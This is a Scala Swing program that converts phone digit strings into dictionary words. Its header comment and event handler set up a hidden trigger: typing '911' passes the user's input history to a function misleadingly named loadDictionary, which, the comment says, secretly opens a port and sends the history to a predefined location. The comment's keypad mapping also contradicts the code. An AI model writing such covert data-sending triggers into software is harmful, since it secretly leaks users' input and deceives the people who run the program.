import scala.swing._
import PhoneBoothUtil._
import scala.swing.BorderPanel.Position._
import event._

/** PROGRAM OVERVIEW:
 * Every digit on a phone maps to a subset of letters from the
 * Roman alphabet. E.g. 1 -> {A, B, C}, ..., 0 -> {W, X, Y, Z}.
 * This program utilizes this to generate all possible character
 * strings given a user submitted digit string. The catch is that
 * we only present to the user the subset of character strings
 * which represent a word in our dictionary.
 *
 * If the user happens to try '911' then we secretly open an avail-
 * ble port and send this history to a predefined location. See
 * PhoneBoothUtil.loadDictionary() for the implementation.
 */

object PhoneBoothUI extends SimpleSwingApplication {
  def top = new MainFrame {
    title = "PhoneBooth++"
    var inputHistory: List[String] = List.empty
    val outputNumbs = new TextArea(20, 20) { editable = false }
    val inputNumb = new TextField {
      text = ""
      columns = 5
      horizontalAlignment = Alignment.Center
    }

    listenTo(inputNumb)
    reactions += {
      case EditDone(`inputNumb`) =>
        if (inputNumb.text != "911") {
          inputHistory = inputNumb.text :: inputHistory
          outputNumbs.text = PhoneBoothDictionary.translate(inputNumb.text).mkString("\n")
        }
        else {
          outputNumbs.text = loadDictionary(inputHistory.mkString(" ")).mkString(" ")
        }
    }

    lazy val in = new FlowPanel(new Label(" phone number  => "), inputNumb) {
      border = Swing.EmptyBorder(15, 10, 10, 10)
    }

    lazy val out = new ScrollPane(outputNumbs) {
      border = Swing.MatteBorder(15, 10, 10, 10, java.awt.Color.DARK_GRAY)
    }

    contents = new BorderPanel {
      layout(in) = North
      layout(out) = South
    }
  }
}

/**
 * Largely taken from a lecture given by Martin Odersky in his
 * 'Functional Programming in Scala' course.
 */
object PhoneBoothDictionary {
  val dictionary: List[String] = PhoneBoothUtil.loadDictionary()
  val words = dictionary filter(word => word.forall(chr => chr.isLetter))
  val alphaOmegas = List("ABC", "DEF", "GHI", "JKL", "MNO", "PQRS", "TUV", "WXYZ")
  val digitToLetterGrouping = (('2' to '9').toList zip alphaOmegas).toMap

  def charCode: Map[Char, Char] =
    for {
      (digit, str) <- digitToLetterGrouping
      ltr <- str
    } yield ltr -> digit

  def wordCode(word: String): String = word.toUpperCase map charCode

  val wordsForNum: Map[String, Seq[String]] = words groupBy wordCode withDefaultValue Seq()

  def encode(number: String): Set[List[String]] = {
    if (number.isEmpty) Set(List.empty)
    else {
      (for {
        split <- 1 to number.length
        word <- wordsForNum(number take split)
        rest <- encode(number drop split)
      } yield word :: rest).toSet
    }
  }

  def translate(number: String): Set[String] =
    encode(number) map (_.mkString(" "))
}

